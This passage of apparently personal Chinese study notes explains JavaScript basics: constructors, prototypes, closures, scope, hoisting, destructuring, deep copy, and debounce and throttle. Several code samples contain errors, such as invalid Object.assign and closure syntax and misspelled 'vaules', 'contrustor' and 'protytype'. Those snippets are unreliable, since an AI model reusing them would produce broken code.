number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">var</span> arr2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">...</span>arr2<span class="token punctuation">,</span> <span class="token operator">...</span>arr1<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// arr1 现在为 [3, 4, 5, 0, 1, 2]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注意:这里使用展开语法创建了一个新的 <code>arr1</code> 数组, <code>Array.unshift</code> 方法则是修改了原本存在的 <code>arr1</code> 数组</p></blockquote><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p>是一种特殊的函数，主要用来初始化对象</p><ol><li>命名一般以大写字母开头。</li><li>构造函数在技术上是常规函数。由 “new” 操作符来执行。</li><li>构造函数内部无需写 return，返回值即为新创建的对象</li><li>使用 new 关键字调用会使函数内部的 this 指向新实例化的对象</li></ol><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> age</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">'zhangsan'</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="实例化执行过程"><a href="#实例化执行过程" class="headerlink" title="实例化执行过程"></a>实例化执行过程</h3><ol><li>创建新对象</li><li>构造函数 this 指向新对象</li><li>执行构造函数代码，修改 this，添加新属性</li><li>返回新对象</li></ol><h3 id="实例成员-amp-静态成员"><a href="#实例成员-amp-静态成员" class="headerlink" title="实例成员&amp;静态成员"></a>实例成员&amp;静态成员</h3><p>通过构造函数创建的对象称为实例对象，实例对象中的属性和方法称为实例成员。通过实例对象调用</p><p>构造函数的属性和方法被称为静态成员，直接通过构造函数调用</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">obj<span class="token punctuation">.</span><span class="token function">method</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Object<span class="token punctuation">.</span><span class="token function">method</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><h3 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h3><ul><li><p>Object.keys(obj) 获取对象中的所有属性键（key）</p><ul><li>返回的是一个数组</li></ul></li><li><p>Object.vaules(obj) 获取对象中所有的属性值</p><ul><li>返回的是一个数组</li></ul></li><li><p>Object.assign(target, src) 用于对象拷贝,经常使用的场景给对象添加属性</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> o <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'zhangsan'</span><span class="token punctuation">,</span> <span class="token literal-property property">age</span><span class="token operator">:</span> <span class="token number">6</span> <span class="token punctuation">&#125;</span>Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span>o<span class="token punctuation">,</span> <span class="token literal-property property">gender</span><span class="token operator">:</span> <span class="token string">'男'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><ol><li>实例属性 <code>length</code> 用来获取字符串的度长</li><li>实例方法 <code>split(&#39;分隔符&#39;)</code> 用来将字符串拆分成数组</li><li>实例方法 <code>substring（需要截取的第一个字符的索引[,结束的索引号]）</code> 用于字符串截取</li><li>实例方法 <code>startsWith(检测字符串[, 检测位置索引号])</code> 检测是否以某字符开头</li><li>实例方法 <code>includes(搜索的字符串[, 检测位置索引号])</code> 判断一个字符串是否包含在另一个字符串中，根据情况返回 true 或 false</li><li>实例方法 <code>toUpperCase</code> 用于将字母转换成大写</li><li>实例方法 <code>toLowerCase</code> 用于将就转换成小写</li><li>实例方法 <code>indexOf</code>  检测是否包含某字符</li><li>实例方法 <code>endsWith</code> 检测是否以某字符结尾</li><li>实例方法 <code>replace</code> 用于替换字符串，支持正则匹配</li><li>实例方法 <code>match</code> 用于查找字符串，支持正则匹配</li></ol><h2 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h2><ul><li><p>全局作用域：<code>&lt;script&gt;</code> 标签和 <code>.js</code> 文件的 〖 最外层 〗 就是所谓的全局作用域</p><blockquote><p>全局作用域中声明的变量 , 任何其它作用域都可以被访问</p><p>为 window 对象动态添加的属性默认也是全局的 , 不推荐 ！<br>函数中未使用任何关键字声明的变量为全局变量 , 不推荐 ！ ！ ！<br>尽可能少的声明全局变量 , 防止全局变量被污染</p></blockquote></li><li><p>局部作用域</p><ul><li><p>函数作用域：在函数内部声明的变量只能在函数内部被访问 , 外部无法直接访问</p><blockquote><p>函数的参数也是函数内部的局部变量</p><p>函数执行完毕后 , 函数内部的变量实际被清空了</p></blockquote></li><li><p>块作用域：在 JavaScript 中使用 <code>&#123;&#125;</code> 包裹的代码称为代码块 , 代码块内部声明的变量外部将 〖 有可能 〗 无法被访问 。</p><blockquote><p>let , const 声明的变量会产生块作用域 , var 不会产生块作用域</p></blockquote></li></ul><p>作用于函数内的代码环境, 就是局部作用域。 因为跟函数有关系, 所以也称为函数作用域。</p></li><li><p>作用域链</p><p>作用域链本质上是底层的变量查找机制 。</p><ol><li>在函数被执行时 , 会优先查找当前函数作用域中查找变量</li><li>如果当前作用域查找不到则会依次逐级查找父级作用域直到全局作用域</li></ol><blockquote><p>总结</p><ol><li>嵌套关系的作用域串联起来形成了作用域链</li><li>相同作用域链中按着从小到大的规则查找变量</li><li>子作用域能够访问父作用域 , 父级作用域无法访问子级作用域</li></ol></blockquote></li></ul><h2 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h2><p>注意：</p><ol><li><p>变量在未声明即被访问时会报语法错误</p></li><li><p>变量在 var 声明之前即被访问, 变量的值为 undefined</p></li><li><p>let&#x2F;const 声明的变量不存在变量提升</p></li><li><p>变量提升出现在相同作用域当中</p><blockquote><p>实际开发中推荐先声明再访问变量</p></blockquote></li></ol><h2 id="函数提升"><a href="#函数提升" class="headerlink" title="函数提升"></a>函数提升</h2><p>函数提升与变量提升比较类似, 是指函数在声明之前即可被调用</p><p>注意：</p><ol><li>函数提升能够使函数的声明调用更灵活</li><li>函数表达式不存在提升的现象</li><li>函数提升出现在相同作用域当中</li></ol><h2 id="垃圾回收机制"><a href="#垃圾回收机制" class="headerlink" title="垃圾回收机制"></a>垃圾回收机制</h2><p>垃圾回收机制(Garbage Collection) 简称 GC</p><h3 id="内存的生命周期"><a href="#内存的生命周期" class="headerlink" title="内存的生命周期"></a>内存的生命周期</h3><ol><li>内存分配：当我们声明变量、函数、对象的时候, 系统会自动为他们分配内存</li><li>内存使用：即读写内存, 也就是使用变量、函数等</li><li>内存回收：使用完毕, 由垃圾回收自动回收不再使用的内存</li><li>说明：<ul><li>全局变量一般不会回收(关闭页面回收)；</li><li>一般情况下局部变量的值, 不用了会被自动回收掉</li></ul></li></ol><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><h4 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h4><p>引用计数算法, 定义“内存不再使用”, 就是看一个对象是否有指向它的引用, 没有引用了就回收对象</p><ol><li>跟踪记录被引用的次数</li><li>如果被引用了一次, 那么就记录次数 1,多次引用会累加 ++</li><li>如果减少一个引用就减 1 –</li><li>如果引用次数是 0 , 则释放内存</li></ol><blockquote><p>引用计数算法存在一个致命的问题：嵌套引用（循环引用）<br>如果两个对象相互引用, 尽管他们已不再使用, 垃圾回收器不会进行回收, 导致内存泄露。<br>因为他们的引用次数永远不会是 0。这样的相互引用如果说很大量的存在就会导致大量的内存泄露</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> o1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">let</span> o2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  o1<span class="token punctuation">.</span>a <span class="token operator">=</span> o2<span class="token punctuation">;</span>  o2<span class="token punctuation">.</span>a <span class="token operator">=</span> o1<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token string">'引用计数无法回收'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">fn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="标记清除法"><a href="#标记清除法" class="headerlink" title="标记清除法"></a>标记清除法</h4><p>现代浏览器通用的大多是基于标记清除算法的某些改进算法, 总体思想都是一致的。</p><ol><li>标记清除算法将“不再使用的对象”定义为“无法达到的对象”。</li><li>就是从根部（在 JS 中就是全局对象）出发定时扫描内存中的对象。 凡是能从根部到达的对象, 都是还需要使用的。</li><li>那些无法由根部出发触及到的对象被标记为不再使用, 稍后进行回收。</li></ol><p><img src="/./JavaScript/image-20230316142927773.png" alt="image-20230316142927773"></p><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>一个函数对周围状态的引用捆绑在一起, 内层函数中访问到其外层函数的作用域<br>简单理解：闭包 &#x3D; 内层函数 + 外层函数的变量</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>封闭数据, 提供操作, 外部也可以访问函数内部的变量<br>闭包的基本格式:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">makeFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> name <span class="token operator">=</span> <span class="token string">"Mozilla"</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">displayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> displayName<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> myFunc <span class="token operator">=</span> <span class="token function">makeFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">myFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 简约写法</span><span class="token keyword">function</span> <span class="token function">makeFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> name <span class="token operator">=</span> <span class="token string">"Mozilla"</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">displayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> myFunc <span class="token operator">=</span> <span class="token function">makeFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">myFunc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="解构赋值"><a href="#解构赋值" class="headerlink" title="解构赋值"></a>解构赋值</h2><h3 id="数组解构"><a href="#数组解构" class="headerlink" title="数组解构"></a>数组解构</h3><p>数组解构是将数组的单元值快速批量赋值给一系列变量的简洁语法</p><ol><li>赋值运算符 &#x3D; 左侧的 [] 用于批量声明变量，右侧数组的单元值将被赋值给左侧的变量</li><li>变量的顺序对应数组单元值的位置依次进行赋值操作</li></ol><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">]</span> <span class="token operator">=</span> array<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">[</span>a <span class="token operator">=</span> aDefault<span class="token punctuation">,</span> b<span class="token punctuation">]</span> <span class="token operator">=</span> array<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> <span class="token punctuation">,</span> b<span class="token punctuation">]</span> <span class="token operator">=</span> array<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token operator">...</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> array<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> <span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token operator">...</span>rest<span class="token punctuation">]</span> <span class="token operator">=</span> array<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">[</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token punctuation">[</span>c<span class="token punctuation">,</span> d<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> array<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="对象解构"><a href="#对象解构" class="headerlink" title="对象解构"></a>对象解构</h3><ol><li>赋值运算符 &#x3D; 左侧的 {} 用于批量声明变量, 右侧对象的属性值将被赋值给左侧的变量</li><li>对象属性的值将被赋值给与属性名相同的变量, 注意解构的变量名不要和外面的变量名冲突否则报错</li><li>对象中找不到与变量名一致的属性时变量值为 undefined</li><li>可以从一个对象中提取变量并同时修改新的变量名</li></ol><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> a<span class="token punctuation">,</span> b <span class="token punctuation">&#125;</span> <span class="token operator">=</span> obj<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">a</span><span class="token operator">:</span> a1<span class="token punctuation">,</span> <span class="token literal-property property">b</span><span class="token operator">:</span> b1 <span class="token punctuation">&#125;</span> <span class="token operator">=</span> obj<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">a</span><span class="token operator">:</span> a1 <span class="token operator">=</span> aDefault<span class="token punctuation">,</span> b <span class="token operator">=</span> bDefault <span class="token punctuation">&#125;</span> <span class="token operator">=</span> obj<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token operator">...</span>rest <span class="token punctuation">&#125;</span> <span class="token operator">=</span> obj<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">a</span><span class="token operator">:</span> a1<span class="token punctuation">,</span> <span class="token literal-property property">b</span><span class="token operator">:</span> b1<span class="token punctuation">,</span> <span class="token operator">...</span>rest <span class="token punctuation">&#125;</span> <span class="token operator">=</span> obj<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token operator">:</span> a <span class="token punctuation">&#125;</span> <span class="token operator">=</span> obj<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h2><h3 id="原型对象"><a href="#原型对象" class="headerlink" title="原型对象"></a>原型对象</h3><p>JavaScript 规定，每一个构造函数都有一个 <code>prototype</code> 属性，指向另一个对象，所以我们也称为原型对象</p><ul><li>这个对象可以挂载函数，对象实例化不会多次创建原型上函数，节约内存</li><li>我们可以把那些不变的方法，直接定义在 prototype 对象上，这样所有对象的实例就可以共享这些方法。</li><li>构造函数和原型对象中的 this 都指向 实例化的对象</li></ul><h3 id="constructor-属性"><a href="#constructor-属性" class="headerlink" title="constructor 属性"></a>constructor 属性</h3><p>每个原型对象里面都有个<code>constructor</code> 属性，该属性指向该原型对象的构造函数</p><blockquote><p>如果有多个对象的方法，我们可以给原型对象采取对象形式赋值.<br>但是这样就会覆盖构造函数原型对象原来的内容，这样修改后的原型对象 constructor 就不再指向当前构造函数了<br>此时，我们可以在修改后的原型对象中，添加一个 constructor 指向原来的构造函数。</p></blockquote><h3 id="对象原型"><a href="#对象原型" class="headerlink" title="对象原型"></a>对象原型</h3><p>每一个对象都有一个属性<code>__proto__</code>指向构造函数的 prototype 原型对象，对象可以使用构造函数原型对象的属性和方法，就是因为对象因为<code>__proto__</code>原型的存在</p><p>注意：</p><ul><li><code>__proto__</code> 是 JS 非标准属性, 推荐使用<code>Object.getPrototypeOf(obj)</code></li><li><code>[[prototype]]</code>和<code>__proto__</code>意义相同</li><li>用来表明当前实例对象指向哪个原型对象 prototype</li><li><code>__proto__</code>对象原型里面也有一个 constructor 属性，指向创建该实例对象的构造函数</li></ul><p><img src="/./JavaScript/image-20230403021928834.png" alt="image-20230403021928834"></p><h3 id="原型继承"><a href="#原型继承" class="headerlink" title="原型继承"></a>原型继承</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> age</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">speak</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">Teacher</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function-variable function">teach</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token class-name">Teacher</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Teacher</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>contrustor <span class="token operator">=</span> Teacher<span class="token punctuation">;</span><span class="token class-name">Student</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Student<span class="token punctuation">.</span>protytype<span class="token punctuation">.</span>contrustor <span class="token operator">=</span> Student<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p>基于原型对象的继承使得不同构造函数的原型对象关联在一起，并且这种关联的关系是一种链状的结构，我们将原型对象的链状结构关系称为原型链</p><p><img src="/./JavaScript/image-20230403023531935.png" alt="image-20230403023531935"></p><ol><li>当访问一个对象的属性（包括方法）时，首先查找这个对象自身有没有该属性。</li><li>如果没有就查找它的原型（也就是 <strong>proto</strong>指向的 prototype 原型对象）</li><li>如果还没有就查找原型对象的原型（Object 的原型对象）</li><li>依此类推一直找到 Object 为止（null）</li><li><code>__proto__</code>对象原型的意义就在于为对象成员查找机制提供一个方向，或者说一条路线</li><li>可以使用 instanceof 运算符用于检测构造函数的 prototype 属性是否出现在某个实例对象的原型链上</li></ol><h2 id="改变this指向的方法"><a href="#改变this指向的方法" class="headerlink" title="改变this指向的方法"></a>改变this指向的方法</h2><ul><li><p>call()</p><p>使用 call 方法调用函数，同时指定被调用函数中 this 的值</p><p><code>fn.call(thisArg[, arg1, arg2, ...])</code></p><ul><li>thisArg: 在fn函数运行时指定的this值</li><li>arg1,arg2: 传递的其他参数</li><li>返回值就是函数的返回值，因为call方法本身就是在调用函数</li></ul></li><li><p>apply()</p><p>使用 apply 方法调用函数，同时指定被调用函数中 this 的值 </p><p><code>fn.apply(thisArg[, argsArray])</code></p><ul><li>thisArg: 在fn函数运行时指定的this值</li><li>argArray: 传递的其他参数，必须包含在数组内</li></ul></li><li><p>bind()</p><p>bind() 方法不会调用函数。但是能改变函数内部this 指向</p><p><code>fn.bind(thisArg[, arg1, arg2, ...])</code></p><ul><li>thisArg: 在fn函数运行时指定的this值</li><li>arg1,arg2: 传递的其他参数</li><li>返回值：指定的this值和初始化参数改造的原函数拷贝(新函数)</li></ul><blockquote><p>因此当我们只是想改变 this 指向，并且不想调用这个函数的时候，可以使用 bind，比如改变定时器内部的this指向.</p></blockquote></li></ul><h2 id="对象深浅拷贝"><a href="#对象深浅拷贝" class="headerlink" title="对象深浅拷贝"></a>对象深浅拷贝</h2><h3 id="直接赋值"><a href="#直接赋值" class="headerlink" title="直接赋值"></a>直接赋值</h3><p>直接赋值的方法，只要是对象，都会相互影响，因为是直接拷贝对象栈里面的地址</p><h3 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h3><p>常见方法：</p><ul><li>拷贝对象：<code>Object.assgin()</code> &#x2F;展开运算符 {…obj}</li><li>拷贝数组：<code>Array.prototype.concat()</code>&#x2F; […arr]</li></ul><p>如果是简单数据类型拷贝值，引用数据类型拷贝的是地址</p><blockquote><p>浅拷贝如果是一层对象，不相互影响，如果出现多层对象拷贝还会相互影响</p></blockquote><h3 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h3><p>拷贝的是对象的属性值，不是地址</p><h3 id="递归实现"><a href="#递归实现" class="headerlink" title="递归实现"></a>递归实现</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">deepClone</span><span class="token punctuation">(</span><span class="token parameter">target<span class="token punctuation">,</span> src</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> key <span class="token keyword">in</span> src<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>src<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token keyword">instanceof</span> <span class="token class-name">Array</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">deepClone</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> src<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>src<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token keyword">instanceof</span> <span class="token class-name">Object</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token function">deepClone</span><span class="token punctuation">(</span>target<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> src<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>        target<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> src<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="通过JSON转换方式实现"><a href="#通过JSON转换方式实现" class="headerlink" title="通过JSON转换方式实现"></a>通过JSON转换方式实现</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>拷贝函数类型会出错</p></blockquote><h2 id="节流和防抖"><a href="#节流和防抖" class="headerlink" title="节流和防抖"></a>节流和防抖</h2><p>防抖(debounce)<br>所谓防抖，就是指触发事件后在 n 秒内函数只能执行一次，如果在 n 秒内又触发了事件，则会重新计算函数执行时间</p><p>所谓节流(throttle)，就是指连续触发事件但是在 n 秒中只执行一次函数。节流会稀释函数的执行频率</p><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><ul><li><p>节流: 鼠标移动，页面尺寸发生变化，滚动条滚动等开销比较<br>大的情况下</p></li><li><p>防抖: 搜索框输入，设定每次输入完毕n秒后发送请求，如果期<br>间还有输入，则从新计算时间</p></li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">debounce</span><span class="token punctuation">(</span><span class="token parameter">func<span class="token punctuation">,</span> wait</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> timer<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span><span class="token punctuation">;</span>        timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token function">func</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> wait<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">throttle</span><span class="token punctuation">(</span><span class="token parameter">func<span class="token punctuation">,</span> wait</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> timer<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>timer<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token function">func</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token 